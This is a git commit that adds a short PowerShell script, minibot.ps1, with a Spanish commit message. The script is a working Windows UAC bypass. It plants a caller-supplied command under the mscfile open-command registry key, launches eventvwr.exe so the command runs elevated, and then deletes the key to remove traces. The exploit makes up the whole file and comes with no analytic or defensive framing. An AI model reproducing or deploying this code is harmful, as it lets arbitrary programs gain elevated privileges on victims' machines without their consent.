43fce2dcab42ef09265e05cccc09bf2dc5ed02ec
Lucius <ajlucea@hotmail.com>
2018-10-11 09:41:14 +0200

    Creado el minibot V1.0.0

---
+++ minibot.ps1
@@ -0,0 +1,17 @@
+function minibot {
+
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
+    Param (
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $C
+    )
+    
+        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"   
+        New-Item $mscCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $C -PropertyType string -Force | Out-Null
+        eventvwr.exe
+	      sleep 5
+	      $registro = "HKCU:\Software\Classes\mscfile"
+        Remove-Item $registro -Recurse -Force
+     }
